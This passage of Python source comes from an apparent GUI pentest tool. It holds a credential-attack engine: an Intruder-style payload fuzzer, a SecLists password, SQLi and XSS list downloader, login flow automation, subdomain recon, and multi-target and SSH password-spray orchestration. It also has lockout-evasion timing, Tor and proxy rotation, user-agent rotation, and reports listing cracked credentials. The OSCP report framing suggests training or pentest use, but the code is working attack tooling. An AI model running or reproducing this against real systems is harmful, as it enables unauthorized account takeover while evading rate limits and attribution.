	def _parse_intruder_sets_text(self, text: str) -> dict:
		sets: dict[str, list[str]] = {}
		lines = [ln.strip() for ln in (text or '').splitlines() if ln.strip() and not ln.strip().startswith('#')]
		for ln in lines:
			if '=' not in ln:
				continue
			marker, src = ln.split('=', 1)
			marker = marker.strip()
			src = src.strip()
			payloads: list[str] = []
			try:
				if src.startswith('file:'):
					path = src[len('file:'):].strip()
					payloads = self._parse_list_file(path)
				elif src.startswith('builtin:'):
					payloads = self._intruder_builtin_payloads(src[len('builtin:'):].strip())
				else:
					# default treat as file path
					payloads = self._parse_list_file(src)
			except Exception:
				payloads = []
			if payloads:
				sets[marker] = payloads
		return sets

	def on_intruder_preview(self) -> None:
		sets = self._parse_intruder_sets_text(self.intr_sets_box.get('1.0','end-1c'))
		if not sets and self.var_intruder_payloads_file.get().strip():
			sets = {self.var_intruder_marker.get() or '§PAYLOAD§': self._parse_list_file(self.var_intruder_payloads_file.get().strip())}
		if not sets:
			messagebox.showinfo("Intruder", "No payload sets configured")
			return
		win = tk.Toplevel(self.root)
		win.title("Intruder preview")
		txt = scrolledtext.ScrolledText(win, height=18, width=100)
		txt.pack(fill=tk.BOTH, expand=True)
		for mk, arr in sets.items():
			txt.insert('end', f"Marker: {mk} - {len(arr)} payloads\n")
			for line in arr[:20]:
				txt.insert('end', f"  {line}\n")
			txt.insert('end', "\n")
		txt.configure(state='disabled')

	def on_download_seclists(self) -> None:
		# Minimal chooser for common sets
		win = tk.Toplevel(self.root)
		win.title("Download Seclists")
		options = [
			("Passwords Top-100", "passwords_top100", "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/top-100.txt"),
			("SQLi Generic", "sqli_generic", "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/SQLi/Generic-SQLi.txt"),
			("XSS Jhaddix", "xss_jhaddix", "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/xss-portswigger.txt")
		]
		checks: list[tuple[tk.BooleanVar, tuple]] = []
		row = 0
		for label, key, url in options:
			v = tk.BooleanVar(value=False)
			cb = ttk.Checkbutton(win, text=label, variable=v)
			cb.grid(row=row, column=0, sticky='w', padx=6, pady=4)
			checks.append((v, (label, key, url)))
			row += 1
		btnf = ttk.Frame(win); btnf.grid(row=row, column=0, sticky='w')
		def do_download():
			base = os.path.join(os.getcwd(), 'seclists')
			os.makedirs(base, exist_ok=True)
			import urllib.request
			ok_any = False
			for var, meta in checks:
				if not var.get():
					continue
				label, key, url = meta
				out = os.path.join(base, key + '.txt')
				try:
					with urllib.request.urlopen(url, timeout=20) as r, open(out, 'wb') as f:
						f.write(r.read())
					ok_any = True
					self.ui_queue.put(("log", f"Downloaded {label} -> {out}"))
				except Exception as exc:
					messagebox.showerror("Download failed", f"{label}: {exc}")
			if ok_any:
				messagebox.showinfo("Seclists", f"Saved to {base}")
			win.destroy()
		ttk.Button(btnf, text="Download", command=do_download).pack(side=tk.LEFT, padx=6)
		ttk.Button(btnf, text="Close", command=win.destroy).pack(side=tk.LEFT, padx=6)

	def _worker_intruder(self, cfg: dict) -> None:
		try:
			mode = (cfg.get('intruder_mode') or 'sniper').lower()
			sets = self._parse_intruder_sets_text(cfg.get('intruder_sets_text') or '')
			markers = cfg.get('intruder_markers') or []
			if not sets and (cfg.get('intruder_payloads_file') or cfg.get('intruder_builtin') != 'none'):
				mk = cfg.get('intruder_marker') or '§PAYLOAD§'
				arr = []
				if cfg.get('intruder_payloads_file'):
					arr = self._parse_list_file(cfg.get('intruder_payloads_file'))
				if not arr:
					arr = self._intruder_builtin_payloads(cfg.get('intruder_builtin'))
				if arr:
					sets = {mk: arr}
			if not markers and sets:
				markers = list(sets.keys())
			if not sets or not markers:
				self.ui_queue.put(("log", "[Intruder] No payload sets configured"))
				self._on_done()
				return
			sess = requests.Session()
			sess.verify = cfg.get('verify_tls', True)
			if cfg.get('headers'):
				sess.headers.update(cfg['headers'])
			if cfg.get('cookies'):
				sess.cookies.update(cfg['cookies'])
			if cfg.get('proxies'):
				sess.proxies.update(cfg['proxies'])
			rate = RateLimiter(float(cfg.get('qps', 1.0)))
			stop_event = threading.Event()
			lock = threading.Lock()
			idx = 0
			def iter_combos():
				if mode == 'sniper':
					# iterate each marker separately
					for mk in markers:
						arr = sets.get(mk, [])
						for pv in arr:
							yield {mk: pv}
				elif mode == 'pitchfork':
					# zip over markers up to min length
					lens = [len(sets.get(mk, [])) for mk in markers]
					if not lens or min(lens) == 0:
						return
					for i in range(min(lens)):
						combo = {mk: sets.get(mk, [])[i] for mk in markers}
						yield combo
				else:
					# clusterbomb cartesian product (cap to avoid explosion)
					max_combos = 20000
					from itertools import product
					arrays = [sets.get(mk, []) for mk in markers]
					if any(not arr for arr in arrays):
						return
					count = 0
					for tup in product(*arrays):
						combo = {mk: pv for mk, pv in zip(markers, tup)}
						yield combo
						count += 1
						if count >= max_combos:
							self.ui_queue.put(("log", f"[Intruder] Reached max combos cap {max_combos}") )
							break
			baseline_len = None
			baseline_status = None
			for combo in iter_combos():
				if self.cancel_requested:
					break
				idx += 1
				try:
					rate.acquire()
					t0 = time.time()
					cfg['intruder_payload_current'] = combo
					resp = self._http_attempt(sess, cfg, username="", password="", call_headers=None, call_proxies=None, call_params_extra=None)
					lat = int((time.time() - t0) * 1000)
					ok = self._is_success(resp, cfg)
					code = getattr(resp, 'status_code', 0)
					text_len = len(getattr(resp, 'text', '') or '') if resp is not None else 0
					if baseline_len is None:
						baseline_len = text_len
						baseline_status = code
					self._record_attempt(ok, code, lat)
					self._maybe_capture_artifact(cfg, user=f"INTRUDER:{combo}", pwd="", method=(cfg.get('method') or 'POST'), url=(cfg.get('url') or ''), headers=dict(getattr(sess, 'headers', {})), params={}, resp=resp, success=ok, proxy=None, ua=None, latency_ms=lat)
					# Post result to UI
					try:
						fail_re = cfg.get('failure_regex')
						succ_re = cfg.get('success_regex')
						text = getattr(resp, 'text', '') or ''
						matched_fail = bool(fail_re and fail_re.search(text))
						matched_succ = bool(succ_re and succ_re.search(text))
						delta = text_len - (baseline_len or 0)
						row = {
							"idx": idx,
							"combo": combo,
							"status": code,
							"len": text_len,
							"delta": delta,
							"ms": lat,
							"succ": int(matched_succ),
							"fail": int(matched_fail),
						}
						self.ui_queue.put(("intruder_result", row))
					except Exception:
						pass
					if ok:
						self.ui_queue.put(("log", f"[Intruder] Potential hit with combo: {combo}"))
				except Exception as exc:
					self.ui_queue.put(("log", f"[Intruder] Error on combo {combo}: {exc}"))
					self._record_attempt(False, 0, 0, error=True)
			self._on_done()
		except Exception as exc:
			self.ui_queue.put(("log", f"[Intruder] Fatal error: {exc}"))
			self._on_done()

	async def _run_flow_async(self, cfg: dict, username: str, password: str) -> dict:
		if httpx is None:
			return {}
		context = {"username": username, "password": password}
		headers = cfg.get('headers') or {}
		cookies = cfg.get('cookies') or {}
		proxies = cfg.get('proxies') or None
		verify = cfg.get('verify', True)
		http2 = bool(cfg.get('http2'))
		timeout = cfg.get('timeout') or 15.0
		async with httpx.AsyncClient(headers=headers, cookies=cookies, verify=verify, http2=http2, timeout=timeout, proxies=proxies, follow_redirects=True) as client:
			for step in self.flow_steps:
				method = (step.get('method') or 'GET').upper()
				url = self._format_template(step.get('url') or '', context)
				if not url:
					continue
				step_headers = step.get('headers') or {}
				body_mode = step.get('body_mode') or 'params'
				body_templ = step.get('body') or ''
				if method == 'GET':
					params = {}
					if body_templ.strip():
						try:
							params = dict(x.split('=',1) for x in self._format_template(body_templ, context).split('&') if '=' in x)
						except Exception:
							params = {}
					resp = await client.get(url, params=params, headers=step_headers)
				else:
					json_payload = None
					data = None
					if body_mode == 'json':
						try:
							json_payload = json.loads(self._format_template(body_templ, context))
						except Exception:
							data = self._format_template(body_templ, context)
					else:
						data = self._format_template(body_templ, context)
					resp = await client.post(url, json=json_payload, data=data if json_payload is None else None, headers=step_headers)
				# extract
				re_pat = (step.get('extract_regex') or '').strip()
				re_var = (step.get('extract_var') or '').strip()
				if re_pat and re_var:
					try:
						m = re.search(re_pat, resp.text or '')
						if m:
							context[re_var] = m.group(1) if m.groups() else m.group(0)
							self.ui_queue.put(("log", f"[Flow-async] Extracted {re_var}"))
					except Exception as _exc:
						self.ui_queue.put(("log", f"[Flow-async] Extract failed: {_exc}"))
		# remember last context
		try:
			self.flow_context_last = dict(context)
		except Exception:
			self.flow_context_last = {}
		# return cookies to apply to sync session
		try:
			return dict(client.cookies)
		except Exception:
			return {}

	def on_export_oscp_markdown(self) -> None:
		"""Export an OSCP-friendly Markdown report including metrics, credentials, evidence, and notes."""
		s = self._report_snapshot()
		path = filedialog.asksaveasfilename(defaultextension=".md", filetypes=[("Markdown", "*.md"), ("All files", "*.*")])
		if not path:
			return
		self.export_oscp_markdown_to(path, snapshot=s)

	def export_oscp_markdown_to(self, path: str, snapshot: dict | None = None) -> None:
		try:
			s = snapshot or self._report_snapshot()
			notes = self.notes_text.get('1.0','end-1c') if hasattr(self, 'notes_text') else ""
			creds = list(getattr(self, 'found_credentials', []))
			lines: list[str] = []
			lines.append("# OSCP Credential Attempt Summary")
			lines.append("")
			lines.append("## Target")
			lines.append(f"- URL: {self.var_target_url.get().strip()}")
			lines.append(f"- Method: {self.var_http_method.get().upper()}")
			lines.append("")
			lines.append("## Summary")
			for k in ["attempts","successes","failures","lockouts","errors","rps_10s","latency_p50_ms","latency_p95_ms","latency_p99_ms"]:
				lines.append(f"- {k}: {s.get(k,'')}")
			lines.append("")
			if creds:
				lines.append("## Found Credentials")
				lines.append("")
				lines.append("| Username | Password | Status | Latency (ms) |")
				lines.append("|---|---:|---:|---:|")
				for c in creds:
					lines.append(f"| {c.get('username','')} | {c.get('password','')} | {c.get('status','')} | {c.get('latency_ms','')} |")
				lines.append("")
			if self.captured_artifacts:
				lines.append("## Evidence (Requests/Responses)")
				for i, a in enumerate(self.captured_artifacts, 1):
					lines.append(f"### Artifact {i}")
					lines.append("")
					lines.append("Request:")
					lines.append("```")
					lines.append(a.get('raw_request',''))
					lines.append("```")
					lines.append("Response:")
					lines.append("```")
					lines.append(a.get('raw_response','')[: int(self.var_capture_max_bytes.get() or 65536)])
					lines.append("```")
					lines.append("")
			if notes:
				lines.append("## Analyst Notes")
				lines.append("")
				lines.append("```")
				lines.append(notes)
				lines.append("```")
			with open(path, "w", encoding="utf-8") as f:
				f.write("\n".join(lines))
			self._append_preview(f"Saved OSCP Markdown to {path}")
		except Exception as exc:
			messagebox.showerror("Export failed", str(exc))

	def on_export_oscp_docx(self) -> None:
		path = filedialog.asksaveasfilename(defaultextension=".docx", filetypes=[("Word Document", "*.docx"), ("All files", "*.*")])
		if not path:
			return
		self.export_oscp_docx_to(path)

	def export_oscp_docx_to(self, path: str) -> None:
		try:
			try:
				from docx import Document
			except Exception:
				messagebox.showerror("Missing dependency", "Install python-docx to export DOCX: pip install python-docx")
				return
			s = self._report_snapshot()
			tpl = (self.var_docx_template_path.get() or "").strip()
			if tpl and os.path.isfile(tpl):
				try:
					doc = Document(tpl)
				except Exception:
					doc = Document()
			else:
				doc = Document()
			doc.add_heading('OSCP Credential Attempt Summary', 0)
			p = doc.add_paragraph()
			p.add_run('Target: ').bold = True
			p.add_run(self.var_target_url.get().strip())
			p = doc.add_paragraph()
			p.add_run('Method: ').bold = True
			p.add_run(self.var_http_method.get().upper())
			doc.add_heading('Summary', level=1)
			for k in ["attempts","successes","failures","lockouts","errors","rps_10s","latency_p50_ms","latency_p95_ms","latency_p99_ms"]:
				doc.add_paragraph(f"{k}: {s.get(k,'')}")
			creds = list(getattr(self, 'found_credentials', []))
			if creds:
				doc.add_heading('Found Credentials', level=1)
				tab = doc.add_table(rows=1, cols=4)
				hdr_cells = tab.rows[0].cells
				hdr_cells[0].text = 'Username'
				hdr_cells[1].text = 'Password'
				hdr_cells[2].text = 'Status'
				hdr_cells[3].text = 'Latency (ms)'
				for c in creds:
					row_cells = tab.add_row().cells
					row_cells[0].text = str(c.get('username',''))
					row_cells[1].text = str(c.get('password',''))
					row_cells[2].text = str(c.get('status',''))
					row_cells[3].text = str(c.get('latency_ms',''))
			notes = self.notes_text.get('1.0','end-1c') if hasattr(self, 'notes_text') else ""
			if notes:
				doc.add_heading('Analyst Notes', level=1)
				doc.add_paragraph(notes)
			if self.captured_artifacts:
				doc.add_heading('Evidence (Requests/Responses)', level=1)
				for i, a in enumerate(self.captured_artifacts, 1):
					doc.add_heading(f'Artifact {i}', level=2)
					doc.add_paragraph('Request:')
					doc.add_paragraph(a.get('raw_request',''))
					doc.add_paragraph('Response:')
					doc.add_paragraph(a.get('raw_response','')[: int(self.var_capture_max_bytes.get() or 65536)])
			doc.save(path)
			self._append_preview(f"Saved OSCP DOCX to {path}")
		except Exception as exc:
			messagebox.showerror("Export failed", str(exc))

	def export_evidence_bundle_to_dir(self, dirpath: str) -> None:
		"""Programmatic export for CLI: evidence bundle to a directory."""
		s = self._report_snapshot()
		try:
			os.makedirs(dirpath, exist_ok=True)
			# HTML
			path_html = os.path.join(dirpath, 'report.html')
			with self.metrics_lock:
				ats = list(self.metrics["attempt_timestamps"])  # copy
			now = time.time()
			buckets = [0]*60
			for t in ats:
				d = int(now - t)
				if 0 <= d < 60:
					buckets[59 - d] += 1
			notes_html = f"<h3>Analyst Notes</h3><pre>{html.escape(self.notes_text.get('1.0','end-1c'))}</pre>" if hasattr(self, 'notes_text') else ""
			creds = list(getattr(self, 'found_credentials', []))
			def _esc(v):
				try:
					return html.escape(str(v))
				except Exception:
					return ""
			creds_rows = "".join(f"<tr><td>{_esc(c.get('username',''))}</td><td>{_esc(c.get('password',''))}</td><td>{_esc(c.get('status',''))}</td><td>{_esc(c.get('latency_ms',''))}</td><td>{_esc(c.get('proxy',''))}</td><td>{_esc(c.get('ua',''))}</td></tr>" for c in creds)
			creds_table = f"<div class='card'><h3>Found Credentials</h3><table border='1' cellpadding='4' cellspacing='0'><tr><th>User</th><th>Pass</th><th>Status</th><th>Latency</th><th>Proxy</th><th>UA</th></tr>{creds_rows}</table></div>" if creds else ""
			html_doc = f"<html><head><meta charset='utf-8'><script src='https://cdn.jsdelivr.net/npm/chart.js'></script></head><body><h1>Pentest Report</h1>{notes_html}{creds_table}<pre>{json.dumps(s, indent=2)}</pre><canvas id='c' height='120'></canvas><script>const d={json.dumps(buckets)};new Chart(document.getElementById('c').getContext('2d'),{{type:'line',data:{{labels:d.map((_,i)=>i-59),datasets:[{{label:'RPS',data:d,borderColor:'#2a7',tension:0.25}}]}},options:{{plugins:{{legend:{{display:false}}}},scales:{{x:{{display:false}},y:{{beginAtZero:true}}}}}}}});</script></body></html>"
			with open(path_html, 'w', encoding='utf-8') as f:
				f.write(html_doc)
			# JSON
			with open(os.path.join(dirpath, 'report.json'), 'w', encoding='utf-8') as f:
				json.dump(s, f, indent=2)
			# CSV
			lines = ["metric,value"]
			for k in ["attempts","successes","failures","lockouts","errors","rps_10s","latency_p50_ms","latency_p95_ms","latency_p99_ms"]:
				lines.append(f"{k},{s.get(k,'')}")
			lines.append("status_code,count")
			for code, cnt in sorted((s.get("status_counts") or {}).items()):
				lines.append(f"{code},{cnt}")
			with open(os.path.join(dirpath, 'report.csv'), 'w', encoding='utf-8') as f:
				f.write("\n".join(lines))
			# Credentials
			if creds:
				with open(os.path.join(dirpath, 'credentials.csv'), 'w', encoding='utf-8') as f:
					f.write("username,password,status,latency_ms,proxy,ua,timestamp\n")
					for c in creds:
						f.write(f"{c.get('username','')},{c.get('password','')},{c.get('status','')},{c.get('latency_ms','')},{c.get('proxy','')},{c.get('ua','')},{c.get('timestamp','')}\n")
				with open(os.path.join(dirpath, 'credentials.txt'), 'w', encoding='utf-8') as f:
					for c in creds:
						f.write(f"{c.get('username','')}:{c.get('password','')}\n")
			# Artifacts
			self._export_artifacts_to_dir(dirpath)
			# HAR
			har = self._build_har()
			with open(os.path.join(dirpath, 'session.har'), 'w', encoding='utf-8') as f:
				json.dump(har, f, indent=2)
			# Screenshot
			self._screenshot_target(self.var_target_url.get().strip(), os.path.join(dirpath, 'screenshot.png'))
			self._append_preview(f"Evidence bundle saved to {dirpath}")
		except Exception as exc:
			messagebox.showerror("Export failed", str(exc))

	def load_profile_from_file(self, path: str) -> None:
		"""Load a profile JSON from a path (non-interactive)."""
		try:
			with open(path, 'r', encoding='utf-8') as f:
				profile = json.load(f)
		except Exception as exc:
			self.ui_queue.put(("log", f"Load failed: {exc}"))
			return
		# Assign fields (same mapping as on_load_profile)
		self.var_name.set(profile.get("name", ""))
		self.var_surname.set(profile.get("surname", ""))
		self.var_city.set(profile.get("city", ""))
		self.var_birthdate.set(profile.get("birthdate", ""))
		self.var_min_len.set(int(profile.get("min_len", 4)))
		self.var_max_len.set(int(profile.get("max_len", 6)))
		self.var_special_chars.set(profile.get("special_chars", "!@#$%_-"))
		self.var_include_digits.set(bool(profile.get("include_digits", True)))
		self.var_include_uppercase.set(bool(profile.get("include_uppercase", True)))
		self.var_mode.set(profile.get("mode", "Brute-force"))
		self.var_gzip.set(bool(profile.get("gzip", False)))
		self.var_target_enabled.set(bool(profile.get("target_enabled", False)))
		self.var_target_url.set(profile.get("target_url", ""))
		self.var_protocol.set(profile.get("protocol", "HTTP"))
		self.var_http_method.set(profile.get("http_method", "POST"))
		self.var_username_value.set(profile.get("username_value", ""))
		self.var_user_param.set(profile.get("user_param", "username"))
		self.var_pass_param.set(profile.get("pass_param", "password"))
		self.var_extra_params.set(profile.get("extra_params", ""))
		self.var_success_codes.set(profile.get("success_codes", "200,302"))
		self.var_success_regex.set(profile.get("success_regex", ""))
		self.var_failure_regex.set(profile.get("failure_regex", ""))
		self.var_qps.set(float(profile.get("qps", 5.0)))
		self.var_enable_sqli.set(bool(profile.get("enable_sqli", False)))
		self.var_sqli_field.set(profile.get("sqli_field", "password"))
		self.var_concurrency.set(int(profile.get("concurrency", 5)))
		self.var_headers_json.set(profile.get("headers_json", ""))
		self.var_cookies.set(profile.get("cookies", ""))
		self.var_proxy_url.set(profile.get("proxy_url", ""))
		self.var_verify_tls.set(bool(profile.get("verify_tls", True)))
		self.var_timeout.set(float(profile.get("timeout", 15.0)))
		self.var_usernames_file.set(profile.get("usernames_file", ""))
		self.var_email_domain.set(profile.get("email_domain", ""))
		self.var_generate_patterns.set(bool(profile.get("generate_patterns", True)))
		self.var_lowercase_usernames.set(bool(profile.get("lowercase_usernames", True)))
		self.var_common_aliases.set(bool(profile.get("common_aliases", True)))
		self.var_spray_enabled.set(bool(profile.get("spray_enabled", False)))
		self.var_spray_passwords_file.set(profile.get("spray_passwords_file", ""))
		self.var_spray_cooldown_min.set(float(profile.get("spray_cooldown_min", 15.0)))
		self.var_spray_window_min.set(float(profile.get("spray_window_min", 60.0)))
		self.var_spray_attempts_per_window.set(int(profile.get("spray_attempts_per_window", 1)))
		self.var_spray_stop_on_success.set(bool(profile.get("spray_stop_on_success", True)))
		self.var_lockout_enabled.set(bool(profile.get("lockout_enabled", True)))
		self.var_lockout_codes.set(profile.get("lockout_codes", "429,423,403"))
		self.var_lockout_regex.set(profile.get("lockout_regex", "account locked|too many attempts|temporarily blocked|captcha"))
		self.var_lockout_cooldown_min.set(float(profile.get("lockout_cooldown_min", 30.0)))
		self.var_lockout_jitter.set(bool(profile.get("lockout_jitter", True)))
		self.var_tor_mode.set(bool(profile.get("tor_mode", False)))
		self.var_tor_proxy.set(profile.get("tor_proxy", "socks5h://127.0.0.1:9050"))
		self.var_proxy_list_file.set(profile.get("proxy_list_file", ""))
		self.var_proxy_rotation.set(profile.get("proxy_rotation", "per_request"))
		self.var_user_agent_rotate.set(bool(profile.get("user_agent_rotate", False)))
		self.var_user_agent_list_file.set(profile.get("user_agent_list_file", ""))
		self.var_user_agent_rotation.set(profile.get("user_agent_rotation", "per_request"))
		self.var_async_engine.set(bool(profile.get("async_engine", False)))
		self.var_http2.set(bool(profile.get("http2", True)))
		self.var_max_connections.set(int(profile.get("max_connections", 100)))
		self.var_retries.set(int(profile.get("retries", 2)))
		self.var_backoff_ms.set(int(profile.get("backoff_ms", 200)))
		self.var_checkpoint_enabled.set(bool(profile.get("checkpoint", {}).get("enabled")))
		self.var_checkpoint_file.set(profile.get("checkpoint", {}).get("file", ""))
		self.var_resume_from_checkpoint.set(bool(profile.get("checkpoint", {}).get("resume")))
		self.var_auto_form.set(bool(profile.get("auto_form")))
		self.var_refresh_csrf.set(bool(profile.get("refresh_csrf")))
		self.var_prelogin_enabled.set(bool(profile.get("prelogin", {}).get("enabled")))
		self.var_prelogin_urls.set(
			", ".join(profile.get("prelogin", {}).get("urls", []))
		)
		self.var_prelogin_per_attempt.set(bool(profile.get("prelogin", {}).get("per_attempt")))
		self.var_prelogin_js.set(bool(profile.get("prelogin", {}).get("headless_js")))
		self.var_body_mode.set(profile.get("body_mode", "params"))
		try:
			self.raw_body_text.delete('1.0', tk.END); self.raw_body_text.insert(tk.END, profile.get("raw_body", ""))
		except Exception:
			pass
		self.var_success_require_redirect.set(bool(profile.get("success_require_redirect", False)))
		self.var_success_length_gt.set(int(profile.get("success_length_gt", 0)))
		self.var_safe_mode.set(bool(profile.get("safe_auto_pause")))
		self.var_allowlist.set(", ".join(profile.get("allowlist", [])) if isinstance(profile.get("allowlist"), list) else profile.get("allowlist", "")
		)
		self.var_safe_qps_cap.set(float(profile.get("safe_qps_cap", 1.0)))
		self.var_safe_concurrency_cap.set(int(profile.get("safe_concurrency_cap", 2)))
		self.var_safe_auto_pause.set(bool(profile.get("safe_auto_pause")))
		self.var_flow_enabled.set(bool(profile.get("flow_enabled", False)))
		self.var_flow_per_attempt.set(bool(profile.get("flow_per_attempt", True)))
		self.flow_steps = list(profile.get("flow_steps", []))
		try:
			self.notes_text.delete('1.0','end'); self.notes_text.insert('1.0', profile.get('notes',''))
		except Exception:
			pass
		self.var_auth_type.set(profile.get('auth_type','None'))
		self.var_auth_user.set(profile.get('auth_user',''))
		self.var_auth_pass.set(profile.get('auth_pass',''))
		self.var_auth_domain.set(profile.get('auth_domain',''))
		self.var_intruder_enabled.set(bool(profile.get('intruder_enabled', False)))
		self.var_intruder_mode.set(profile.get('intruder_mode','sniper'))
		self.var_intruder_markers.set(','.join(profile.get('intruder_markers', [])))
		self.var_intruder_marker.set(profile.get('intruder_marker','§PAYLOAD§'))
		self.var_intruder_payloads_file.set(profile.get('intruder_payloads_file',''))
		self.var_intruder_builtin.set(profile.get('intruder_builtin','none'))
		try:
			self.intr_sets_box.delete('1.0', 'end'); self.intr_sets_box.insert('1.0', profile.get('intruder_sets_text',''))
		except Exception:
			pass
		self._info("Profile loaded (CLI)")

	# -------------------- Recon CLI helpers --------------------
	async def _recon_scan_async(domain: str, subdomains: list[str], concurrency: int = 50, timeout: float = 5.0) -> list[dict]:
		results: list[dict] = []
		if httpx is None:
			return results
		sem = asyncio.Semaphore(concurrency)
		async with httpx.AsyncClient(timeout=timeout, verify=False, follow_redirects=True, http2=True) as client:
			async def check(host: str) -> None:
				url1 = f"http://{host}"
				url2 = f"https://{host}"
				for url in (url2, url1):
					try:
						async with sem:
							r = await client.get(url)
							results.append({"host": host, "url": str(r.request.url), "status": int(r.status_code), "len": len(r.text)})
							return
					except Exception:
						continue
				results.append({"host": host, "url": None, "status": None, "len": 0})
			tasks = [asyncio.create_task(check(f"{s}.{domain}")) for s in subdomains]
			await asyncio.gather(*tasks, return_exceptions=True)
		return results

	def run_recon_cli(domain: str, wordlist_path: str, out_dir: str, max_subs: int = 1000) -> None:
		try:
			subs: list[str] = []
			with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
				for line in f:
					w = line.strip()
					if w:
						subs.append(w)
			subs = subs[:max_subs]
		except Exception as exc:
			print(f"[recon] Failed to read wordlist: {exc}", file=sys.stderr)
			return
		print(f"[recon] Scanning {len(subs)} subdomains for {domain}...")
		alive = asyncio.run(_recon_scan_async(domain, subs))
		os.makedirs(out_dir, exist_ok=True)
		alive_only = [r for r in alive if r.get('url')]
		alive_only.sort(key=lambda x: (x.get('status') or 999, -x.get('len', 0)))
		with open(os.path.join(out_dir, 'recon_alive.json'), 'w', encoding='utf-8') as f:
			json.dump(alive_only, f, indent=2)
		with open(os.path.join(out_dir, 'recon_alive.txt'), 'w', encoding='utf-8') as f:
			for r in alive_only:
				f.write(f"{r.get('url')} {r.get('status')} {r.get('len')}\n")
		print(f"[recon] Alive: {len(alive_only)} -> {os.path.join(out_dir, 'recon_alive.txt')}\n")

	# -------------------- Multi-target orchestration --------------------

	def _parse_targets_file(path: str) -> list[str]:
		urls: list[str] = []
		try:
			with open(path, 'r', encoding='utf-8', errors='ignore') as f:
				for line in f:
					w = line.strip()
					if not w or w.startswith('#'):
						continue
					if not w.startswith('http'):
						w = 'http://' + w
					urls.append(w)
		except Exception as exc:
			print(f"[targets] Failed to read {path}: {exc}", file=sys.stderr)
		return urls


	def _parse_nmap_xml_targets(path: str) -> list[str]:
		urls: list[str] = []
		try:
			tree = ET.parse(path)
			root = tree.getroot()
			for host in root.findall('host'):
				addr = None
				for a in host.findall('address'):
					if a.get('addr'):
						addr = a.get('addr')
						break
				if addr is None:
					continue
				services: list[tuple[int, str]] = []
				ports = host.find('ports')
				if ports is None:
					continue
				for p in ports.findall('port'):
					state = (p.find('state').get('state') if p.find('state') is not None else '')
					if state != 'open':
						continue
					portid = int(p.get('portid') or 0)
					service = p.find('service')
					name = (service.get('name') if service is not None else '') or ''
					services.append((portid, name))
				# Heuristics: any service containing 'https' -> https; 'http' -> http
				for portid, name in services:
					nm = name.lower()
					if 'http' in nm:
						scheme = 'https' if ('https' in nm or portid == 443) else 'http'
						urls.append(f"{scheme}://{addr}:{portid}")
		except Exception as exc:
			print(f"[nmap] Failed to parse {path}: {exc}", file=sys.stderr)
		return urls


	def _label_for_target(url: str) -> str:
		try:
			u = urlparse(url)
			host = u.hostname or 'target'
			port = u.port
			label = host if not port else f"{host}_{port}"
			label = re.sub(r"[^A-Za-z0-9_.-]", "_", label)
			return label
		except Exception:
			return "target"


	def _replace_target_placeholders(app: 'PasswordListGeneratorApp', url: str) -> None:
		base_host = (urlparse(url).hostname or '')
		try:
			# Replace TARGET in main URL
			if 'TARGET' in app.var_target_url.get():
				app.var_target_url.set(app.var_target_url.get().replace('TARGET', base_host))
			# Replace in flow steps
			for step in app.flow_steps:
				u = step.get('url') or ''
				if 'TARGET' in u:
					step['url'] = u.replace('TARGET', base_host)
		except Exception:
			pass


	def _aggregate_md(out_path: str, sections: list[dict]) -> None:
		try:
			lines: list[str] = []
			lines.append("# Multi-target Summary\n")
			for sec in sections:
				label = sec.get('label','target')
				url = sec.get('url','')
				s = sec.get('snapshot',{})
				creds = sec.get('credentials',[])
				lines.append(f"## {label}")
				lines.append("")
				lines.append(f"- URL: {url}")
				for k in ["attempts","successes","failures","lockouts","errors","rps_10s","latency_p50_ms","latency_p95_ms","latency_p99_ms"]:
					lines.append(f"- {k}: {s.get(k,'')}")
				if creds:
					lines.append("")
					lines.append("| Username | Password | Status | Latency (ms) |")
					lines.append("|---|---:|---:|---:|")
					for c in creds:
						lines.append(f"| {c.get('username','')} | {c.get('password','')} | {c.get('status','')} | {c.get('latency_ms','')} |")
					lines.append("")
			with open(out_path, 'w', encoding='utf-8') as f:
				f.write("\n".join(lines))
		except Exception as exc:
			print(f"[aggregate] Failed MD export: {exc}", file=sys.stderr)


	def _aggregate_docx(out_path: str, sections: list[dict]) -> None:
		try:
			from docx import Document
			doc = Document()
			doc.add_heading('Multi-target Summary', 0)
			for sec in sections:
				label = sec.get('label','target')
				url = sec.get('url','')
				s = sec.get('snapshot',{})
				creds = sec.get('credentials',[])
				doc.add_heading(label, level=1)
				p = doc.add_paragraph(); p.add_run('URL: ').bold = True; p.add_run(url)
				for k in ["attempts","successes","failures","lockouts","errors","rps_10s","latency_p50_ms","latency_p95_ms","latency_p99_ms"]:
					doc.add_paragraph(f"{k}: {s.get(k,'')}")
				if creds:
					tab = doc.add_table(rows=1, cols=4)
					hdr = tab.rows[0].cells
					hdr[0].text='Username'; hdr[1].text='Password'; hdr[2].text='Status'; hdr[3].text='Latency (ms)'
					for c in creds:
						row = tab.add_row().cells
						row[0].text = str(c.get('username',''))
						row[1].text = str(c.get('password',''))
						row[2].text = str(c.get('status',''))
						row[3].text = str(c.get('latency_ms',''))
			doc.save(out_path)
		except Exception as exc:
			print(f"[aggregate] Failed DOCX export: {exc}", file=sys.stderr)


	def run_multi_targets_cli(profile_path: str, targets: list[str], base_out_dir: str | None, aggregate_md: str | None, aggregate_docx: str | None, no_gui: bool = True) -> None:
		sections: list[dict] = []
		for url in targets:
			label = _label_for_target(url)
			out_dir = os.path.join(base_out_dir or os.getcwd(), label)
			os.makedirs(out_dir, exist_ok=True)
			app = PasswordListGeneratorApp()
			try:
				if no_gui:
					app.root.withdraw()
			except Exception:
				pass
			app.load_profile_from_file(profile_path)
			app.var_target_url.set(url)
			_replace_target_placeholders(app, url)
			app.on_generate()
			if app.worker_thread:
				try:
					while app.worker_thread.is_alive():
						app.worker_thread.join(timeout=0.5)
				except KeyboardInterrupt:
					app.cancel_requested = True
					if app.worker_thread:
						app.worker_thread.join()
			# Export per-target bundle
			app.export_evidence_bundle_to_dir(out_dir)
			sec = {"label": label, "url": url, "snapshot": app._report_snapshot(), "credentials": list(getattr(app, 'found_credentials', []))}
			sections.append(sec)
		# Aggregate
		if aggregate_md:
			_aggregate_md(aggregate_md, sections)
		if aggregate_docx:
			_aggregate_docx(aggregate_docx, sections)

	def _worker_pentest_ssh(self, mode: str, min_len: int, max_len: int, cfg: dict) -> tuple[int, str]:
		if paramiko is None:
			return 0, "Missing dependency: install paramiko for SSH spray"
		completed = 0
		found_msg = ""
		limiter = RateLimiter(cfg.get('qps') or 1.0)
